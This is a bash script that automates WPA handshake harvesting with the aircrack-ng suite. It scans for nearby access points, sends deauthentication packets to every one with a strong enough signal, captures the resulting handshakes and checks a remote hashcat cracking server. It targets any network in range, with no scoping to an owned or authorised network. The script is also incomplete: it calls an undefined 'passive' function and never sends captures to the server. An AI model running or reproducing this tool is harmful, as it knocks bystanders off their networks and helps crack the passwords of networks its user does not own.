#!/bin/bash

interface=""
serverAddr=""

checkUtils(){
        printf "Check utilities\n"

        #airmon-ng
        output=$(airmon-ng)
        if [[ "$output" == *"PHY"* ]]; then

                printf "airmon-ng....\033[32m Done\033[0m\n"
        else
                printf "airmon-ng....\033[31m Fail \033[0m\n"
                exit 1
        fi

        #airodump-ng
        output=$(airodump-ng)
        if [[ "$output" == *"usage: airodump-ng"* ]]; then
                printf "airodump-ng....\033[32m Done\033[0m\n"
        else
                printf "airodump-ng....\033[31m Fail \033[0m\n"
                exit 1
        fi

        #cap2hccapx
        output=`cap2hccapx 2>&1`
        if [[ "$output" == *"usage: cap2hccapx input.pcap output.hccapx"* ]]; then
                printf "cap2hccapx....\033[32m Done\033[0m\n"
        else
                printf "cap2hccapx....\033[31m Fail \033[0m\n"
                exit 1
        fi

        printf "\n"
}


checkServer(){
        curl http://$serverAddr/handshakes &> /dev/null
        if [[ $? == 0 ]]; then
                printf "Server status - \033[32m working \033[0m\n"
        else
                printf "Server status - \033[31m not working \033[0m\n"
                exit 1
        fi
}

active() {
  echo "Collect APs..."
  timeout 30 airodump-ng -w /home/kali/hscollector/shakesCollector $interface </dev/null >/dev/null 
  ls /home/kali/hscollector
  while IFS=, read -r bssid firsttimeseen lasttimeseen channel speed privacy cipher auth power beacons; do

          if [[ $power == "" ]]
          then 
                  break
          fi

          if [[ $bssid == "BSSID" ]];then
                  continue
          fi
          if [[ $power -lt -60 ]]
          then
                  continue
          fi
          
          printf "Attack: $bssid \nChannel: $channel \nPower: $power\n"
          iwconfig $interface channel $channel
          airodump-ng --bssid $bssid --channel $channel -w /home/kali/hscollector/shakes $interface &>/dev/null &
          pid=`echo $!`
          aireplay-ng -a $bssid -0 10 $interface
          injectionExitCode=`echo $?`
          if [[ $injectionExitCode -ne 0 ]]
          then
                  kill -9 $pid
                  continue
          fi
          sleep 20
          kill -9 $pid
          rm /home/kali/hscollector/shakes-* >/dev/null
  done < <(tail -n +2  /home/kali/hscollector/shakesCollector-01.csv)
}

getparams(){
        printf "Please select an action:\n"
        printf "1) Start active attack\n2) Start passive attack\n3) Get crack results\nEnter: "
        read;
        re='^[0-9]+$'
        if ! [[ ${REPLY} =~ $re ]] || [[ ${REPLY} >3 ]]; then
                printf "Invalid input.\n"
                exit 1
        fi
        command=${REPLY}
        if [[ ${REPLY} == 1 ]] || [[ ${REPLY} == 2 ]] ;then
                if [[ $interface != "" ]];then
                        if [[ $command == 1 ]];then
                                active
                        fi
                        if [[ $command == 2 ]];then
                                passive
                        fi
                else


                        printf "Please set the wireless interface(e.g. wlan0):\n"
                        read;
                        interface=${REPLY}
                        output=$(airmon-ng start $interface)
                        if [[ "$output" == *"monitor mode vif enabled for"* ]] || [[ "$output" == *"monitor mode already enabled"* ]]; then
                                printf "Monitor mode on $interface \033[32m ....Enabled \033[0m\n"
                        else
                                printf "Monitor mode failed enable on $interface \033[31m .... Fail \033[0m\n"
                                exit 1
                        fi

                        printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\n"
                        read;
                        serverAddr=${REPLY}
                        checkServer
                fi

        else if [[ ${REPLY} == 3 ]];then
                printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\n"
                read;
                serverAddr=${REPLY}
                checkServer
        fi
        fi
        getparams

}

cleanup(){
        rm /home/kali/hscollector/shakes* &> /dev/null
        rm /home/kali/hscollector/cleanshakes.hccapx &> /dev/null
}

trap cleanup SIGINT SIGTERM ERR EXIT

main(){
        checkUtils
        getparams
        cleanup
}
main
